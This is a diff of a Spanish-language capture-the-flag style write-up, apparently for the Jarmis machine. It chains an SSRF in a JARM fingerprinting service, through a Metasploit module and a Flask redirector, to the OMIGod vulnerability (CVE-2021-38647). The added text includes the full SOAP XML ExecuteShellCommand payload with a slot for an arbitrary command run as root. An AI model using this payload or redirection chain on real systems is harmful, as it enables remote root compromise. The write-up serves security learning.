@@ -187,7 +187,7 @@ La captura en Wireshark volvió a registrar 11 flujos, lo que confirma que la in
 
 La siguiente fase del análisis, por tanto, se orienta a identificar un mecanismo que permita interceptar, redirigir o manipular esta undécima solicitud, con el objetivo de determinar si puede instrumentalizarse como un canal SSRF capaz de emitir peticiones POST hacia los puertos internos 5985 y 5986, habilitando así la explotación del vector OMIGod.
 
-<p align="center"><strong><u>SSRF</u></strong></p>
+<p align="center"><strong>SSRF</strong></p>
 
 Con el objetivo de analizar en profundidad la naturaleza del undécimo flujo TLS —el que no forma parte del proceso estándar de fingerprinting JARM— se planteó la posibilidad de interceptar y redirigir dicha solicitud para determinar su estructura, su método HTTP y su potencial como vector de SSRF. Dado que los módulos existentes de Metasploit no contemplan esta funcionalidad de forma nativa, se procedió a desarrollar un módulo personalizado que permitiera capturar la petición y redirigirla hacia un destino arbitrario bajo control del atacante.
 
@@ -225,32 +225,45 @@ Este comportamiento constituye una validación inequívoca: la undécima solicit
 
 Dado que la explotación de OMIGod (CVE 2021 38647) requiere la emisión de una petición POST hacia el servicio OMI en los puertos 5985/5986, la capacidad de redirigir esta undécima solicitud constituye el puente necesario para desencadenar la vulnerabilidad y obtener ejecución remota de código con privilegios de root.
 
-OMIGod
+<p align="center"><strong>OMIGod</strong></p>
 
 La explotación de OMIGod (CVE 2021 38647) exige la emisión de una petición POST hacia el servicio OMI, alojado en los puertos internos 5985/TCP (sin TLS) y 5986/TCP (con TLS). El proof of concept disponible en GitHub confirma que el vector de ataque consiste en enviar un cuerpo SOAP XML especialmente construido, donde el elemento <p:command> contiene la instrucción arbitraria que será ejecutada con privilegios de root en el host remoto. 
 
- 
-
-
-
-
-
-
-
-
-
-
-
-
-
+<img src="assets/41.png">  
 
 El payload se inserta dinámicamente mediante el método .format(), lo que permite adaptar la carga útil a las necesidades del atacante.
-
- 
+```xml
+DATA = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
+   <s:Header>
+      <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
+      <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
+      <a:ReplyTo>
+         <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
+      </a:ReplyTo>
+      <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
+      <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
+      <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
+      <w:OperationTimeout>PT1M30S</w:OperationTimeout>
+      <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
+      <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
+      <w:OptionSet s:mustUnderstand="true" />
+      <w:SelectorSet>
+         <w:Selector Name="__cimnamespace">root/scx</w:Selector>
+      </w:SelectorSet>
+   </s:Header>
+   <s:Body>
+      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
+         <p:command>{}</p:command>
+         <p:timeout>0</p:timeout>
+      </p:ExecuteShellCommand_INPUT>
+   </s:Body>
+</s:Envelope>
+"""
+```
 
 Dado que el servicio OMI no es accesible desde el exterior, la única vía viable para desencadenar la vulnerabilidad consiste en instrumentalizar el SSRF previamente identificado en el undécimo flujo TLS generado por Jarmis. Sin embargo, este flujo únicamente se activa cuando la firma JARM coincide con un registro catalogado como malicioso en la base de datos interna. Por ello, resulta imprescindible encadenar la solicitud a través de Metasploit, cuya firma sí está presente en el repositorio, y no interactuar directamente con un servidor Flask, cuya huella no desencadenaría la fase de obtención de metadatos.
 
- 
+<img src="assets/42.png">  
 
 El siguiente desafío consiste en transformar esta solicitud suplementaria en una petición POST, ya que el backend de Jarmis, al generar la undécima conexión, utiliza un User Agent identificado como curl, lo que abre la puerta a redirigir la solicitud hacia un esquema Gopher, capaz de encapsular peticiones arbitrarias, incluyendo POST con cuerpo XML. No obstante, para facilitar la depuración y mantener un control granular sobre la lógica de redirección, se optó por una arquitectura en cadena:
 
@@ -261,21 +274,11 @@ El siguiente desafío consiste en transformar esta solicitud suplementaria en un
 
 Para ello, se configuró Metasploit de modo que redirigiera la solicitud hacia un servidor Flask escuchando en 8443/TCP con TLS. El servidor Flask, implementado de forma minimalista, aceptaba la conexión entrante y la reenviaba hacia un destino arbitrario. La configuración incluía ssl_context para habilitar TLS, host='0.0.0.0' para permitir conexiones externas y debug=True para facilitar la modificación del código sin reiniciar la aplicación.
 
- 
-
-
-
-
-
-
-
-
-
-
+<img src="assets/43.png">
 
 Una vez desplegado el servidor Flask, se verificó la cadena de redirección: al solicitar la generación de la firma JARM desde Jarmis, la petición era interceptada por el módulo personalizado de Metasploit, reenviada al servidor Flask y finalmente redirigida hacia un listener nc en el puerto 80 del atacante. La captura confirmó que la cadena funcionaba correctamente y que la solicitud podía ser desviada hacia cualquier destino.
 
- 
+ <img src="assets/44.png">
 
 Este resultado constituye una validación crítica: la solicitud suplementaria generada por Jarmis es completamente redirigible y manipulable, lo que habilita un vector de SSRF plenamente funcional. La arquitectura en cadena permite ahora transformar la solicitud en un POST dirigido al puerto interno 5985, encapsulando el cuerpo SOAP XML necesario para explotar OMIGod. 
 
